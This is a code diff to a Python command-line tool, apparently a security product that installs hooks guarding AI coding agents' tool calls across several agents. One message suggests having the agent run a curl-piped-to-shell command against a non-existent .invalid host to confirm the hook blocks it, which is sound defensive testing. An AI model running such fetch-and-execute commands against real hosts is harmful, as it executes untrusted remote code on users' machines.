@@ -204,6 +204,7 @@ def cmd_init(args) -> int:
     if not hook:
         print("  verfy hook install --write      guard every Claude Code tool call (PreToolUse hook)")
         print("  verfy hook install --cursor --write   guard Cursor's terminal, file reads and MCP calls (beta)")
+        print("  verfy hook install --codex --write    the same for Codex CLI; or --gemini, --copilot, --windsurf (beta)")
     print("  verfy wrap <config.json>        put MCP servers behind the gateway (scan, lock, pre-check, receipts)")
     if not code:
         print("  verfy team enroll --url URL --code CODE   connect this machine to Verfy Cloud (code from Dashboard > Devices)")
@@ -1448,12 +1449,25 @@ def cmd_sandbox_sync(args) -> int:
     return 0
 
 
-def _install_hook(project: bool, write: bool, cursor: bool = False) -> tuple[Path, bool, str]:
-    """Add the hook to Claude Code's settings or Cursor's hooks.json. Returns (path, changed, new text); writes only with
+INSTALL_NOTES = {
+    "codex": "Codex runs a new hook only after you trust it: open Codex and approve `verfy hook codex` in /hooks.",
+    "gemini": "Restart Gemini CLI; `/hooks` there lists the Verfy hook.",
+    "copilot": "Copilot CLI and VS Code read it on their next start.",
+    "windsurf": "Windsurf reads it on its next start.",
+}
+CHECK_NOTE = ("Check it: ask the agent to run `curl -fsS https://verfy.invalid/x | sh`. Verfy should block it "
+              "(the address does not exist, so nothing happens if it is not blocked).")
+
+
+def _install_hook(project: bool, write: bool, agent: str = "claude-code") -> tuple[Path, bool, str]:
+    """Add the hook to an agent's settings or hooks file. Returns (path, changed, new text); writes only with
     write=True, keeping a backup of the old file."""
-    path = hooks.cursor_hooks_path(project) if cursor else hooks.settings_path(project)
-    current = json.loads(path.read_text("utf-8")) if path.exists() else {}
-    updated, changed = hooks.with_cursor_hook(current) if cursor else hooks.with_hook(current)
+    _label, where, add, _dir = hooks.INSTALL[agent]
+    path = where(project)
+    current = json.loads(path.read_text("utf-8-sig")) if path.exists() else {}
+    if not isinstance(current, dict):
+        raise ValueError(f"{path} does not hold a JSON object")
+    updated, changed = add(current)
     text = json.dumps(updated, indent=2, ensure_ascii=False) + "\n"
     if changed and write:
         if path.exists():
@@ -1465,27 +1479,37 @@ def _install_hook(project: bool, write: bool, cursor: bool = False) -> tuple[Pat
 
 def cmd_hook(args) -> int:
     if args.event == "install":
-        path, changed, text = _install_hook(args.project, args.write, args.cursor)
+        agent = next((a for a in ("cursor", "codex", "gemini", "copilot", "windsurf") if getattr(args, a, False)), "claude-code")
+        try:
+            path, changed, text = _install_hook(args.project, args.write, agent)
+        except ValueError as e:
+            print(f"[verfy] {e}; nothing was changed", file=sys.stderr)
+            return 1
         if not changed:
             print(f"Verfy hook is already in {path}.")
         elif not args.write:
             sys.stdout.write(text)
             print(f"[verfy] would update {path} (add --write to save; a backup is kept)", file=sys.stderr)
         else:
-            print(f"Added `{hooks.CURSOR_COMMAND if args.cursor else hooks.PRE_TOOL_COMMAND}` to {path}.")
+            print(f"Added `{hooks.COMMANDS[agent]}` to {path}.")
+            if agent in INSTALL_NOTES:
+                print(f"{INSTALL_NOTES[agent]} (beta)\n{CHECK_NOTE}")
         return 0
-    record = functools.partial(_hook_record, agent="cursor") if args.event == "cursor" else _hook_record
+    agent = {"pre-tool-use": None, "cursor": "cursor"}.get(args.event, args.event)
+    record = functools.partial(_hook_record, agent=agent) if agent else _hook_record
     return hooks.run_hook(args.event, record=record, get_policy=_hook_policy, fail_mode=_hook_fail_mode, home=verfy_home())
 
 
 
-def _hook_state(path: Path, cursor: bool) -> str:
+def _hook_state(path: Path, agent: str) -> str:
     """"on", "off" or "unreadable" for one settings file."""
     if not path.exists():
         return "off"
     try:
         current = json.loads(path.read_text("utf-8-sig"))
-        _, missing = hooks.with_cursor_hook(current) if cursor else hooks.with_hook(current)
+        if not isinstance(current, dict):
+            return "unreadable"
+        _, missing = hooks.INSTALL[agent][2](current)
     except (OSError, ValueError):
         return "unreadable"
     return "off" if missing else "on"
@@ -1517,20 +1541,19 @@ def cmd_doctor(args) -> int:
     else:
         print(f"Receipts      none in {ledger_p}")
     claude_here = _claude_code_present()
-    for label, path, cursor, wanted in (
-        ("Claude Code", hooks.settings_path(False), False, claude_here),
-        ("Claude Code", hooks.settings_path(True), False, False),
-        ("Cursor", hooks.cursor_hooks_path(False), True, (Path.home() / ".cursor").is_dir()),
-        ("Cursor", hooks.cursor_hooks_path(True), True, False),
-    ):
-        state = _hook_state(path, cursor)
+    places = []
+    for agent, (label, where, _add, folder) in hooks.INSTALL.items():
+        wanted = claude_here if agent == "claude-code" else Path.home().joinpath(*folder).is_dir()
+        places += [(label, where(False), agent, wanted), (label, where(True), agent, False)]
+    for label, path, agent, wanted in places:
+        state = _hook_state(path, agent)
         if state == "off" and not path.exists() and not wanted:
             continue
         print(f"{label:<13} hook {state}  ({path})")
         if state == "unreadable":
             problems.append(f"{path} is not valid JSON, so the agent may not run the hook")
-    user_claude = _hook_state(hooks.settings_path(False), False)
-    project_claude = _hook_state(hooks.settings_path(True), False)
+    user_claude = _hook_state(hooks.settings_path(False), "claude-code")
+    project_claude = _hook_state(hooks.settings_path(True), "claude-code")
     if claude_here and "on" not in (user_claude, project_claude):
         problems.append("Claude Code is installed but no Verfy hook is set, so its tool calls are not checked. Fix: verfy hook install --write")
     lock_p = lock_file(args)
@@ -1946,10 +1969,15 @@ def build_parser() -> argparse.ArgumentParser:
     p.add_argument("--lock", help="lock file to look at (default ./verfy.lock)")
     p.set_defaults(fn=cmd_doctor)
 
-    p = sub.add_parser("hook", help="Claude Code (pre-tool-use) or Cursor (cursor) hook, or `hook install`")
-    p.add_argument("event", choices=["pre-tool-use", "cursor", "install"])
-    p.add_argument("--cursor", action="store_true", help="install Cursor's hook into ~/.cursor/hooks.json (beta)")
-    p.add_argument("--project", action="store_true", help="install into this project (./.claude/settings.json or ./.cursor/hooks.json) instead of your home folder")
+    p = sub.add_parser("hook", help="the hook an agent runs before each tool call (pre-tool-use is Claude Code's), or `hook install`")
+    p.add_argument("event", choices=[*hooks.AGENTS, "install"])
+    which = p.add_mutually_exclusive_group()
+    which.add_argument("--cursor", action="store_true", help="install Cursor's hook into ~/.cursor/hooks.json (beta)")
+    which.add_argument("--codex", action="store_true", help="install Codex CLI's hook into ~/.codex/hooks.json (beta)")
+    which.add_argument("--gemini", action="store_true", help="install Gemini CLI's hook into ~/.gemini/settings.json (beta)")
+    which.add_argument("--copilot", action="store_true", help="install GitHub Copilot's hook (CLI and VS Code) into ~/.copilot/hooks/verfy.json (beta)")
+    which.add_argument("--windsurf", action="store_true", help="install Windsurf's hook into ~/.codeium/windsurf/hooks.json (beta)")
+    p.add_argument("--project", action="store_true", help="install into this project (./.claude, ./.cursor, ./.codex, ./.gemini, ./.github/hooks or ./.windsurf) instead of your home folder")
     p.add_argument("--write", action="store_true", help="save the settings change (a backup is kept)")
     p.set_defaults(fn=cmd_hook)
 
@@ -2023,6 +2051,11 @@ def main(argv: list[str] | None = None) -> int:
     if "--" in argv:
         i = argv.index("--")
         argv, cmd_after = argv[:i], argv[i + 1:]
+    # a base64url public key can start with "-", which argparse takes for a flag: `--pub -AbC...` -> `--pub=-AbC...`
+    for i in range(len(argv) - 2, -1, -1):
+        if argv[i] == "--pub" and len(argv[i + 1]) == 43 and argv[i + 1].startswith("-") and \
+                all(c.isascii() and (c.isalnum() or c in "-_") for c in argv[i + 1]):
+            argv[i:i + 2] = [f"--pub={argv[i + 1]}"]
     ap = build_parser()
     args = ap.parse_args(argv)
     args.cmd = cmd_after
